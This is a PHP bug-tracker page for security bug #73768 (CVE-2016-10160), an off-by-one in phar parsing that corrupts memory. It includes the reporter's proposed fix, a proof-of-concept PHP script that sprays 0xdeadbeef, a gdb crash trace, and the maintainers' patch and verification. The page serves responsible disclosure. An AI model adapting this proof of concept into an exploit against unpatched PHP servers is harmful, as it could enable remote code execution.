<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='PHAR related Bug #73768 - RDF' href='rss/bug.php?id=73768'>
        <link rel='alternate' type='application/rss+xml' title='PHAR related Bug #73768 - RSS 2.0' href='rss/bug.php?id=73768&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #73768 :: Memory corruption when loading hostile phar</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=73768">Sec Bug</a>&nbsp;#73768</th>
            <td id="summary" colspan="5">Memory corruption when loading hostile phar</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-12-16 23:39 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2017-01-25 11:11 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>eyal &#x64;&#111;&#x74; itkin &#x61;&#116; gmail &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=PHAR+related">PHAR related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.6.29</td>
            <th class="details">OS:</th>
            <td></td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10160" target="_blank">2016-10160</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=73768&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=73768&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=73768&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1481931594">&nbsp;</a><strong>[2016-12-16 23:39 UTC] eyal &#x64;&#111;&#x74; itkin &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
When loading a hostile phar archive, there is an off-by-one that can cause a memory corruption, and possibly trigger a remote code execution.

phar.c in phar_parse_pharfile() incorrectly '\0' terminates the buffer in case the alias does not match:
buffer[tmp_len] = '\0';

When a hostile archive sets tmp_len to be manifest_length - 14, this will write the '\0' just outside the buffer, thus overriding emalloc's metadata.

The assignment should be replaced with:
buffer[MIN(tmp_len, (size_t)(endbuffer - buffer) - 1)] = '\0';

This fix is connected to bug report #73763 I reported earlier, and both reports should probably be fixed together to assure they correspond to each other.

Test script:
---------------
&lt;?php
	$length = 192;
	$array  = array();
	$x = 0;
	while ( $x &lt; 4 ){
		$array[$x++] = str_repeat($x, ($length - 20));
	}

	try{
		$p = Phar::LoadPhar('example_hostile.phar', 'alias.phar');
	}
	catch(Exception $e){
		echo &quot;Failed to load the phar archive\n&quot;;
	}

	$s = str_repeat(&quot;\xef\xbe\xad\xde&quot;, ($length - 20) / 4);
	while ( $x &lt; 8 ){
		$array[$x++] = str_repeat($x, ($length - 20));
	}
?&gt;

Expected result:
----------------
no crash

Actual result:
--------------
segmentation fault, when accessing address 0xdeadbeef during emalloc:

#0  0x80260e75 in _emalloc ()
#1  0x802610d8 in _safe_emalloc ()
#2  0x801fac73 in zif_str_repeat ()
#3  0x8031b662 in execute_internal ()
#4  0x80274dce in dtrace_execute_internal ()
#5  0x8030cf65 in ?? ()
#6  0x802c56da in execute_ex ()
#7  0x80274c35 in dtrace_execute_ex ()
#8  0x8031d1b6 in zend_execute ()
#9  0x8028510d in zend_execute_scripts ()
#10 0x80224054 in php_execute_script ()
#11 0x8031f01f in ?? ()
#12 0x800fe64f in main ()
(gdb) info reg
eax            0xdeadbeef	-559038737
ecx            0xb5000074	-1258291084
edx            0xd	13
ebx            0xb5000040	-1258291136
esp            0xbffedf80	0xbffedf80
ebp            0xb50131e0	0xb50131e0
esi            0x7	7
edi            0x1	1
eip            0x80260e75	0x80260e75 &lt;_emalloc+101&gt;
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51


</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=73768'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=73768'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1482822229">&nbsp;</a><strong>[2016-12-27 07:03 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Open</span>
<span class="added">+Status: Feedback</span>
</div></div></div><div class='comment type_comment' ><a name="1482822229">&nbsp;</a><strong>[2016-12-27 07:03 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Please provide example_hostile.phar.
</pre>
</div><div class='comment type_log' ><a name="1482829670">&nbsp;</a><strong>[2016-12-27 09:07 UTC] eyal &#x64;&#111;&#x74; itkin &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Feedback</span>
<span class="added">+Status: Open</span>
</div></div></div><div class='comment type_comment' ><a name="1482829670">&nbsp;</a><strong>[2016-12-27 09:07 UTC] eyal &#x64;&#111;&#x74; itkin &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Uploaded the example_hostile.phar (+ the python script than generated it) to this link: <a href="http://www.cs.tau.ac.il/~eyalitki/Upload/73768/" rel="nofollow">http://www.cs.tau.ac.il/~eyalitki/Upload/73768/</a>
</pre>
</div><div class='comment type_log' ><a name="1483142346">&nbsp;</a><strong>[2016-12-30 23:59 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-PHP Version: 7.1.0</span>
<span class="added">+PHP Version: 5.6.29</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1483142346">&nbsp;</a><strong>[2016-12-30 23:59 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The fix is in security repo as b28b8b2fee6dfa6fcd13305c581bb835689ac3be and in <a href="https://gist.github.com/84961673ee34be7f1a52b83dd872af50" rel="nofollow">https://gist.github.com/84961673ee34be7f1a52b83dd872af50</a>

please verify
</pre>
</div><div class='comment type_log' ><a name="1483146058">&nbsp;</a><strong>[2016-12-31 01:00 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: needed</span>
</div></div></div><div class='comment type_comment' ><a name="1483174214">&nbsp;</a><strong>[2016-12-31 08:50 UTC] eyal &#x64;&#111;&#x74; itkin &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>I verified the fix in the repository, and it will indeed solve this vulnerability.

Wanted to ask why did the PHP version changed to 5.X instead of 7.X? The vulnerability was found (and reproduced) in the latest PHP version, and it also (but not only) applies to previous versions.
</pre>
</div><div class='comment type_svn' ><a name="1483420316">&nbsp;</a><strong>[2017-01-03 05:11 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=b28b8b2fee6dfa6fcd13305c581bb835689ac3be" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=b28b8b2fee6dfa6fcd13305c581bb835689ac3be</a>
Log: Fix <a href='bug.php?id=73768'>bug #73768</a> - Memory corruption when loading hostile phar
</pre>
</div><div class='comment type_log' ><a name="1483420316">&nbsp;</a><strong>[2017-01-03 05:11 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1483421193">&nbsp;</a><strong>[2017-01-03 05:26 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=b28b8b2fee6dfa6fcd13305c581bb835689ac3be" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=b28b8b2fee6dfa6fcd13305c581bb835689ac3be</a>
Log: Fix <a href='bug.php?id=73768'>bug #73768</a> - Memory corruption when loading hostile phar
</pre>
</div><div class='comment type_log' ><a name="1485342673">&nbsp;</a><strong>[2017-01-25 11:11 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID: needed</span>
<span class="added">+CVE-ID: 2016-10160</span>
</div></div></div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
